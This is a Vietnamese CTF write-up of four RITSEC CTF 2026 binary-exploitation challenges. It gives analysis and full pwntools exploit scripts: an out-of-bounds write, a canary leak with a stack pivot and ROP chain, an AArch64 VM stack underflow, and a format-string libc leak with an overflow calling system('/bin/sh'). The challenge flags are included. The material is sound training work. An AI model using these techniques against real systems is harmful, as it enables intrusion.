---
title: "WRITE UP RITSEC CTF 2026"
date: 2026-04-06
lastmod: 2026-04-17 
description: "Writes up Risec CTF 2026 - PWN"
draft: false
author: "Author Name"
tags: ["CTF", "Pwn", "Risec CTF"]
categories: ["Writeups"]
cover: 'https://ctf.ritsec.club/assets/images/ritsec-26_logo.png'
stage: 'evergreen'
colophon: true 
type: "post"
image: "/images/avatar.jpg"
---
<style>
  /* 1. THU NHỎ AVATAR XUỐNG MỨC TINH TẾ (50px) */
  /* Nhắm chính xác vào thẻ img của avatar để không bắt nhầm ảnh bài viết */
  header img, 
  [class*="author"] img, 
  img[alt*="niddalA"] {
    width: 50px !important;    /* Chỉnh số này nếu muốn to/nhỏ hơn tí nữa */
    height: 50px !important;
    max-width: 50px !important;
    border-radius: 50% !important;
    object-fit: cover !important;
    display: inline-block !important;
    vertical-align: middle !important; /* Căn giữa với dòng chữ tên bạn */
    margin-right: 10px !important;   /* Tạo khoảng cách với tên "niddalA" */
  }

  /* 2. ĐẢM BẢO CHỮ VẪN TRÀN LỀ ĐẸP */
  article p, article li {
    text-indent: 0 !important;
    max-width: 100% !important;
    width: 100% !important;
    text-align: left !important;
    margin-bottom: 1.2em !important; /* Giãn dòng giữa các đoạn văn cho dễ đọc */
  }

  /* 3. ẢNH TRONG BÀI VIẾT VẪN TO RÕ RÀNG */
  .post-content img, section img {
    width: 100% !important;
    height: auto !important;
    display: block;
    margin: 25px 0 !important;
  }
</style>
# WRITE UP RISEC CTF 2026 (FOR PRACTICE)
Credit: ![image](https://hackmd.io/_uploads/Bk0mnieh-g.png)
(Tham khảo bài 2,3,4 - Đã chỉnh sửa lại một số chỗ)
## 1. BAKE A PIE
![image](https://hackmd.io/_uploads/rk2V8ix2Wg.png)
### PHÂN TÍCH
Challenge cho ta một file zip, sau khi extract file ta được một file binary
SOURCE CODE:
```c

void main(void)

{
  uint uVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  char local_29;
  uint local_28;
  uint local_24;
  undefined8 local_20;
  
  local_20 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  puts("I want to create the perfect pi recipe, but can\'t quite get it right...");
  puts("Can you help me bake the perfect pi?");
  putchar(10);
  do {
    while( true ) {
      while( true ) {
        puts("------------------------------------------------------------");
        printf("(S)how recipe, (C)change ingredient, (T)aste test: ");
        __isoc99_scanf("%c%*c",&local_29);
        if (local_29 != 'T') break;
        if (pi == 3.141592653589793) {
          puts("Yummy! This is the perfect pi!");
          execl("/bin/bash","/bin/bash",0);
        }
        else {
          puts("Still doesn\'t taste right. Let\'s try a different recipe.");
        }
      }
      if (local_29 < 'U') break;
LAB_0040140e:
      printf("Unknown option \'%c\'\n",(ulong)(uint)(int)local_29);
    }
    if (local_29 == 'C') {
      printf("Which ingredient would you like to change?: ");
      __isoc99_scanf("%u%*c",&local_28);
      if (local_28 < 9) {
        printf("Enter ingredient: ");
        fgets(ingredients + (ulong)local_28 * 0x20,0x20,stdin);
        uVar1 = local_28;
        sVar2 = strlen(ingredients + (ulong)local_28 * 0x20);
        *(undefined1 *)((ulong)uVar1 * 0x20 + sVar2 + 0x40407f) = 0;
      }
      else {
        puts("The recipe doesn\'t have that many ingredients");
      }
    }
    else {
      if (local_29 != 'S') goto LAB_0040140e;
      for (local_24 = 0; local_24 < 8; local_24 = local_24 + 1) {
        printf("%d. %s\n",(ulong)local_24,ingredients + (ulong)local_24 * 0x20);
      }
    }
  } while( true );
}
```
Chương trình mắc lỗi ở OPTION 'C', Cụ thể là lỗi OOB (Out Of Bounds)
```c
printf("Which ingredient would you like to change?: ");
__isoc99_scanf("%u%*c",&local_28);
if (local_28 < 9) { // <--- LỖ HỔNG Ở ĐÂY
    printf("Enter ingredient: ");
    fgets(ingredients + (ulong)local_28 * 0x20, 0x20, stdin);
}
```
Ở trong tùy chọn S chương trình chỉ in ra 0->7 tổng là 8 phần tử:
```c
for (local_24 = 0; local_24 < 8; local_24 = local_24 + 1) {
        printf("%d. %s\n",(ulong)local_24,ingredients + (ulong)local_24 * 0x20);
}
```
Nhưng ở OPTION C cho nhập tới index 8
Điều kiện để win bài này rất đơn giản
```c
if (pi == 3.141592653589793) {
          puts("Yummy! This is the perfect pi!");
          execl("/bin/bash","/bin/bash",0);
}
```
Nếu ghi đè được biến pi thành 3.141592653589793 thì hàm sẽ vào SHELL!!!
vì biến pi nằm ngay sau mảng ingredients(tạm gọi) khi ta nhập index = 8 tương đương với ingredients[8] == pi (vì mảng ingredients chỉ đến index 7) thì ta sẽ ghi đè được vào biến pi
Ta đổi: 3.141592653589793 == 0x400921fb54442d18
### PAYLOAD
```python
from pwn import *
p = remote('bake-a-pi.ctf.ritsec.club',1555)

p.sendlineafter(b'?', b'C')
p.sendlineafter(b':', b'8')
p.sendlineafter(b':', p64(0x400921fb54442d18))
p.sendline(b'T')

p.interactive()
```
`FLAG: RS{0ff_by_0n3_4s_e4sy_4s_4_sk1llb17_p1}`
## 2. doMonkeysSwim
![image](https://hackmd.io/_uploads/ryZGqixhbx.png)
### Phân tích:
![image](https://hackmd.io/_uploads/rk89ijxhbg.png)
Bài có 6 option trong đó có 3 option sau có dính lỗi:
`Monket see`: Cho phép nhập index để in ra một giá trị. Không có cơ chế kiểm tra giới hạn (Out-of-bounds Read). Nếu nhập index = 3, ta rò rỉ (leak) được Stack Canary
`Monkey swaperoo`: Cho phép ghi một lượng lớn dữ liệu tùy ý vào một vùng nhớ BSS có tên là bed (địa chỉ cố định 0x4cca60).
`Monkey do`: Sử dụng hàm `fgets(buf, 40, stdin)`. buf nằm cách Canary 24 bytes. Ta có 24 (padding) + 8 (Canary) + 8 (Saved RBP) = 40 bytes. Đây là lỗi Stack/Buffer Overflow vừa khít để ghi đè RBP, mở đường cho kỹ thuật Stack Pivot.
### Ý tưởng khai thác:
Vì fgets chỉ cho phép ghi đè đúng đến Saved RBP (không chạm tới được Saved RIP), ta không thể chạy ROP chain trực tiếp trên Stack. Giải pháp là kết hợp Stack Pivot và BSS Injection.
1. Leak Canary. Lấy Canary từ `Option 3` để chuẩn bị cho payload overflow, đảm bảo chương trình không bị crash khi kết thúc hàm.
2. Ghi một ROP Chain hoàn chỉnh và chuỗi "/bin/sh\x00" vào vùng nhớ bed thông qua `Option 5`.
3. Dùng Option 4, gửi payload đè 24 bytes rác + Canary xịn + Saved RBP trỏ về vùng nhớ bed.
4. Khi hàm main kết thúc, lệnh leave; ret sẽ gán RSP = RBP, khiến Stack bị xoay (pivot) sang vùng bed và bắt đầu thực thi ROP Chain.
### PAYLOAD
```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("doMonkeysSwim_patched", checksec=False)
context.binary = exe
context.log_level = "debug"
context.terminal = ['alacritty', '-e']

def main():
    io = remote("dms.ctf.ritsec.club", 1400)

    io.recvuntil(b">> ")

    io.sendline(b"3")
    io.sendline(b"3")
    io.recvuntil(b"0x")
    canary = int(io.recvline().strip(), 16)
    io.recvuntil(b">> ")

    bed = exe.sym["bed"]
    poprdi = 0x401f43
    poprsi = 0x401f45
    poprdx = 0x401f47
    poprax = 0x401f49
    syscall = 0x401f26

    payload = p64(canary)
    payload += p64(0)
    payload += p64(poprdi)
    payload += p64(bed + 0x58)
    payload += p64(poprsi)
    payload += p64(0)
    payload += p64(poprdx)
    payload += p64(0)
    payload += p64(poprax)
    payload += p64(59)
    payload += p64(syscall)
    payload += b"/bin/sh\x00"

    io.sendline(b"5")
    io.recvuntil(b"Swap this: ")
    io.send(payload)
    io.send(b"\n")
    io.recvuntil(b"With this: ")
    io.sendline(b"B")
    io.recvuntil(b">> ")

    overflow = b"A" * 0x18 + p64(canary) + p64(bed + 8)[:-1]
    io.sendline(b"4")
    io.send(overflow)
    io.send(b"\n")
    io.recvuntil(b">> ")

    io.sendline(b"6")
    io.interactive()


if __name__ == "__main__":
    main()
```
`FLAG: RS{wh3r3_h4s_4ll_th3_rum_g0n3_mr_m0nk3y_m4n?}`
## 3. Marauder Might
![image](https://hackmd.io/_uploads/H1VNcsg2-e.png)
Tổng quan: Một máy ảo (Virtual Machine) tùy chỉnh có lỗi logic trong việc quản lý ngăn xếp (Stack Management).
### Phân tích tĩnh (Static Analysis)
#### Luồng thực thi chính (main):
Hàm main tại 0x4009e8 thực hiện các công việc cơ bản: thiết lập buffering cho stdout/stdin và bắt đầu một vòng lặp nạp/chạy chương trình VM.
```c
while (readprogram(&var_20, 0) == 0) {
    runprogram(&var_20); // Thực thi logic VM
    freeprogram(&var_20);
}
```
#### Kiến trúc ngăn xếp của VM (Host Stack Frame):
Điểm mấu chốt nằm ở cách hàm runprogram (tại 0x400890) thiết lập Stack Frame trên kiến trúc AArch64.

Dựa trên mã máy:
```bash
00400890  sub  sp, sp, #0x820     ; Cấp phát 0x820 bytes
00400894  stp  fp, lr, [sp]       ; Lưu Frame Pointer và Link Register (Return Address)
00400898  mov  fp, sp             ; FP trỏ vào đáy stack hiện tại
```
Trong AArch64, lr (Link Register - địa chỉ trả về) được lưu tại [sp + 0x8]. Ngay phía trên nó, từ [sp + 0x10] trở đi, là vùng nhớ dành cho VM Stack.
#### Lỗ hổng Underflow tại hàm Pop:
Máy ảo sử dụng một con trỏ toàn cục `data_4a1968` để quản lý đỉnh ngăn xếp của nó (VM SP). Hãy nhìn vào hàm pop tại 0x40083c:
```bash
0040083c    data_4a1968 -= 8        // Giảm con trỏ VM SP đi 8 đơn vị (lùi về 1 slot)
00400850    result.q = *data_4a1968 // Trả về giá trị tại vị trí mới
00400854    return result
```
Lỗ hổng: Hàm này hoàn toàn không kiểm tra biên dưới (Lower bound check). Nếu chương trình VM thực hiện lệnh pop khi stack đang rỗng (con trỏ đang ở sp + 0x10), con trỏ sẽ bị trừ đi 8 và nhảy về sp + 0x8.

Hệ quả: Vị trí sp + 0x8 chính là nơi lưu trữ lr của hàm Host. Chúng ta có thể đọc hoặc ghi đè địa chỉ trả về của hàm runprogram bằng các lệnh VM.
### Phân tích Opcode và Logic VM
Máy ảo xử lý các byte dữ liệu (Opcodes) theo luồng sau:
`Opcode 0x01`: Thoát vòng lặp (break), kết thúc chương trình VM.
`Opcode 0x02`: Nhánh lệnh phức tạp.
Nếu byte tiếp theo là 0x02: Gọi sub_400824(), hàm này thực chất thực hiện lệnh pop.
`Opcode 0x00`: Đọc một byte index và đẩy một giá trị từ bảng dữ liệu vào stack (push).
### Kịch bản khai thác
Để chiếm quyền điều khiển, chúng ta cần thực hiện các bước sau:
1. Đưa địa chỉ mục tiêu vào bộ nhớ: Chúng ta cần địa chỉ của hàm win (0x400780) xuất hiện trong luồng xử lý để có thể ghi nó vào ngăn xếp.
2. Kích hoạt Underflow: Gửi chuỗi Opcode \x02\x02. Lúc này, con trỏ ngăn xếp của VM (data_4a1968) sẽ bị lùi từ sp + 0x10 về sp + 0x8 (đúng vị trí của lr).
3. Ghi đè LR: Thực hiện một thao tác ghi (như nạp dữ liệu chương trình) để giá trị 0x400780 đè lên địa chỉ trả về cũ.
4. Kích hoạt thực thi: Gửi Opcode \x01 để VM thoát vòng lặp. Khi hàm runprogram thực hiện lệnh ret, nó sẽ nạp giá trị tại sp + 0x8 (lúc này đã là địa chỉ hàm win) vào Program Counter (PC).
### PAYLOAD
```python
from pwn import *

# Thiết lập môi trường
context.binary = ELF("./fractured_ship")
context.arch = "aarch64"
win_addr = 0x400780

# Xây dựng Payload
payload = p32(1)              # Header/Số lượng lệnh (tùy thuộc vào readprogram)
payload += p64(win_addr)      # Dữ liệu sẽ được dùng để ghi đè vào LR
payload += b"\x02\x02"        # Lệnh Pop lậu -> Khiến VM SP trỏ vào LR trên Host Stack
payload += b"\x00\x00"        # Padding/Tham số bổ sung
payload += b"\x01"            # Lệnh Stop -> Thoát VM và nhảy tới hàm Win

io = remote("marauder-might.ctf.ritsec.club", 1739)
io.send(payload)
io.interactive()
```
`FLAG: RS{th3_G4rc1a_0F_gr4pp1in6}`
## 4. Carening
![image](https://hackmd.io/_uploads/rJEss3e3Wl.png)

### PAYLOAD
```python
#!/usr/bin/env python3
from pwn import *

# Thiết lập môi trường
context.arch = 'amd64'
context.encoding = 'utf-8'

# Thông tin mục tiêu
host = "careening.ctf.ritsec.club"
port = 1501
libc = ELF("./libc.so.6", checksec=False) # Đảm bảo file libc nằm cùng thư mục

def get_io():
    return remote(host, port)

# --- STAGE 1: LEAK LIBC ---
log.info("Bắt đầu Stage 1: Leak địa chỉ Libc...")
io = get_io()

# Sử dụng Format String thông qua User-Agent để leak atoll (tham số thứ 1)
# Theo disassembly: snprintf(&s, 0x100, &format, atoll, __return_addr, ...)
leak_payload = (
    b"GET /msg/0 HTTP/1.0\r\n"
    b"Host: " + host.encode() + b"\r\n"
    b"X-Debug: 1\r\n"
    b"User-Agent: %p|%p\r\n" # %p đầu tiên sẽ là địa chỉ của hàm atoll
    b"\r\n"
)

io.send(leak_payload)
io.recvuntil(b"X-Debug-Info: ")

# Lấy địa chỉ leak và tính toán Libc Base
leaks = io.recvline().strip().split(b"|")
atoll_leak = int(leaks[0], 16)
libc.address = atoll_leak - libc.sym['atoll']

log.success(f"Atoll leak: {hex(atoll_leak)}")
log.success(f"Libc base:  {hex(libc.address)}")

io.close()

# --- STAGE 2: EXPLOIT OVERFLOW ---
log.info("Bắt đầu Stage 2: Ghi đè stack và gọi system('/bin/sh')...")
shell = get_io()

# Tìm địa chỉ system và chuỗi "/bin/sh" trong libc đã leak
system_addr = libc.sym['system']
binsh_addr = next(libc.search(b"/bin/sh\x00"))

# Payload overflow:
# Padding 0x210 bytes để chạm đến rsp+0x230 (nơi lưu hàm sẽ được call)
# Ghi đè [rsp+0x230] bằng system
# Ghi đè [rsp+0x238] bằng địa chỉ "/bin/sh" (để nạp vào RDI)
overflow_data = b"A" * 0x210
overflow_data += p64(system_addr)
overflow_data += p64(binsh_addr)

# Gửi POST request với Content-Length đủ lớn để trigger memcpy overflow
post_payload = (
    b"POST /msg/0 HTTP/1.0\r\n"
    b"Host: " + host.encode() + b"\r\n"
    b"Content-Length: " + str(len(overflow_data)).encode() + b"\r\n"
    b"\r\n"
    + overflow_data
)

shell.send(post_payload)

log.success("Đã gửi payload. Đang chuyển sang chế độ tương tác...")
shell.interactive()
```
`FLAG: RS{CFI_b1ind_sp0t_g0t_us3d_4g41n5t_b04rd_53cur1ty}`